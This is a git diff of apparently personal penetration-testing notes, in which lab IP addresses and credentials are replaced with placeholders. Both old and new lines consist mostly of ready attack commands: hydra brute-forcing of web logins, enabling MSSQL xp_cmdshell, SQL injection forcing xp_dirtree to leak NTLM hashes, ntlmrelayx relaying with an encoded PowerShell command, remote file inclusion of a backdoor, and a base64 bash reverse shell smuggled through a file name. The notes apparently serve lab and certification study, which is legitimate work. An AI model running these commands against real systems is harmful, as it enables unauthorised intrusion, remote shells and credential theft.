@@ -4,36 +4,24 @@
 - default password of the service
 - weak passwords (admin, root, password123, Password...)
 	- try the name of the service or username as password as well
-- search passwords in ftp, smb, snmp, ...
-- add rules to brute force
-- search for passwords managers like KeePass (database.kdbx)
+- search passwords in ftp, smb, snmp, KeePass ...
+- add rules to wordlists
 
-
+brute force
 ```
-# brute force
 hydra -l <user> -P <password> -s <port> <protocol>://<ip>
 
 # http login pages
-hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+hydra -l user -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
 
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.164.103 http-post-form -s 8080 "/login:password=^PASS^:Incorrect password."  
+hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-post-form -s 8080 "/login:password=^PASS^:Incorrect password."  
 
 # HTTP Basic Authentication
-hydra -I -V -C creds.txt -t 1 "http-get://192.168.228.131:80/svn:A=BASIC:F=401"
+hydra -I -V -C creds.txt -t 1 "http-get://<IP>:<PORT>/svn:A=BASIC:F=401"
 
 # username and password encoded
-hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://192.168.233.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'
-
-patator http_fuzz url=https://172.16.10.248:8081/lib/crud/userprocess.php method=POST body='user=admin&pass=COMBO00&sublogin=1' 0=/usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt after_urls=https://172.16.10.248:8081/dashboard.php accept_cookie=1 follow=1 max_follow=2 -x ignore:clen=5878
+hydra -I -f -L custom-wordlist.txt -P custom-wordlist.txt 'http-post-form://<url>:username=^USER64^&password=^PASS64^:C=/:F=403'
 ```
-
-
-tools:
-- hashcat
-- hashid
-- john
-- ssh2john
-- patator
 
 wordlists
 ```
@@ -43,22 +31,18 @@ wordlists
 
 create generate wordlist using cewl
 ```
-cewl http://<ip>:<port>/ | grep -v CeWL > custom-wordlist.txt
-cewl --lowercase http://<ip>:<port>/ | grep -v CeWL  >> custom-wordlist.txt
+cewl http://<IP>:<PORT>/ | grep -v CeWL > custom-wordlist.txt
+cewl --lowercase http://<IP>:<PORT>/ | grep -v CeWL  >> custom-wordlist.txt
 ```
 
 generate user wordlist base user info
 ```
-~/offsec/tools/userlistcreator.py
+userlistcreator.py
 
-python3 ~/offsec/tools/cupp/cupp.py -i
-```
+python3 cupp.py -i
 
-another generate tool, username-anarchy https://github.com/urbanadventurer/username-anarchy
+username-anarchy --input-file ./user.txt > users.txt
 ```
-~/offsec/tools/username-anarchy --input-file ./user.txt > users.txt
-```
-
 
 ### SQL
 
@@ -98,7 +82,7 @@ UNION-based Payloads
 
 ```
 # connect to mysql DB
-mysql -u root -p'root' -h 192.168.50.16 -P 3306
+mysql -u root -p'root' -h <IP> -P 3306
 
 # check version
 select version();
@@ -171,10 +155,9 @@ UNION-based Payloads
 
 ```
 # connect to mssql DB
-mssqlclient.py Administrator:Lab123@192.168.50.18 -windows-auth
-mssqlclient.py domain/Administrator:Lab123@192.168.50.18 -windows-auth
-mssqlclient.py PublicUser:GuestUserCantWrite1@sequel.htb
-
+mssqlclient.py <USER>:<PASS>@<IP> -windows-auth
+mssqlclient.py domain/<USER>:<PASS>@<IP> -windows-auth
+mssqlclient.py <USER>:<PASS>@<DOMAIN>
 
 # check version
 SELECT @@version;
@@ -197,9 +180,9 @@ EXECUTE AS LOGIN = '<username>'
 ###### run commands
 ```
 # login
-mssqlclient.py Administrator:Lab123@192.168.50.18 -windows-auth
-mssqlclient.py domain/Administrator:Lab123@192.168.50.18 -windows-auth
-mssqlclient.py PublicUser:GuestUserCantWrite1@sequel.htb
+mssqlclient.py <USER>:<PASS>@<IP> -windows-auth
+mssqlclient.py domain/<USER>:<PASS>@<IP> -windows-auth
+mssqlclient.py <USER>:<PASS>@<DOMAIN>
 
 # enable xp_cmdshell
 EXECUTE sp_configure 'show advanced options', 1;
@@ -207,7 +190,7 @@ RECONFIGURE;
 EXECUTE sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 
-#One liner
+# one liner
 EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 
 # run commands
@@ -259,7 +242,7 @@ sudo responder -I tun0
 # connect from mssql to smb server that i host using responder
 EXEC MASTER.sys.xp_dirtree '\\<kali ip>\test', 1, 1
 
-' OR 1=1 ; exec master.dbo.xp_dirtree '\\192.168.49.239\test';--
+' OR 1=1 ; exec master.dbo.xp_dirtree '\\<IP>\test';--
 
 # crack the hash
 hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -O
@@ -268,13 +251,13 @@ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rule
  ###### relay attack
 ```
 # start smb server with the comment base64 encoded
-sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.247.159 -c "powershell -e JABjAGwAaQBlAG4Ad"
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c "powershell -e JABjAGwAaQBlAG4Ad"
 
 # login to smb server
-mssqlclient.py Administrator:Lab123@192.168.50.18 -windows-auth
+mssqlclient.py <USER>:<PASS>@<IP> -windows-auth
 
 # connect ti smb share
-SQL> EXEC MASTER.sys.xp_dirtree '\\192.168.45.243\test', 1, 1
+SQL> EXEC MASTER.sys.xp_dirtree '\\<IP>\test', 1, 1
 
 # get shell if you run revers shell
 nc -lvnp 80 
@@ -283,13 +266,13 @@ nc -lvnp 80
 ###### dump hashes
 ```
 # start smb server 
-sudo impacket-ntlmrelayx -t 192.168.247.159 -smb2support
+sudo impacket-ntlmrelayx -t <IP> -smb2support
 
 # login to smb server
-mssqlclient.py Administrator:Lab123@192.168.50.18 -windows-auth
+mssqlclient.py <USER>:<PASS>@<IP> -windows-auth
 
 # connect to smb share
-SQL> xp_dirtree '\\192.168.45.243\share'
+SQL> xp_dirtree '\\<IP>\share'
 
 # in the impacket-ntlmrelayx we will see hashes
 . . .
@@ -357,7 +340,7 @@ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=adm
 
 curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
 
-curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
+curl "http://mountaindesserts.com/meteor/index.php?page=http://<IP>/simple-backdoor.php&cmd=ls"
 
 ```
 
@@ -399,7 +382,7 @@ https://book.hacktricks.xyz/pentesting-web/command-injection
 
 file names as command injection
 ```
-echo -n 'bash -c "bash -i >& /dev/tcp/10.10.16.4/4444 0>&1"' | base64
+echo -n 'bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"' | base64
 YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQ0NDQgMD4mMSI=
 
 touch -- ';echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzQ0NDQgMD4mMSI= | base64 -d | bash'
@@ -413,9 +396,9 @@ there are several tools here to take advantage when we found git file in the web
 https://github.com/internetwache/GitTools/tree/master
 
 ```
-bash /home/pinklii/offsec/tools/gitdumper.sh http://target.tld/.git/ <dest folder>
+bash /home/pinklii/offsec/tools/gitdumper.sh http://<IP>/.git/ <dest folder>
 
-git-dumper http://bullybox.local/.git .
+git-dumper http://<IP>/.git .
 ```
 
 search:
@@ -432,7 +415,7 @@ sudo responder -I tun0
 
 sudo impacket-smbserver -smb2support evilshare "$PWD"
 
-\\192.168.45.193\evilshare
+\\<IP>\evilshare
 
 # crack the hash
 hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -O
@@ -504,5 +487,4 @@ found ssh key but cant connect via ssh
 ```
 python3 -m venv path/to/venv
 source path/to/venv/bin/activate
-
 ```
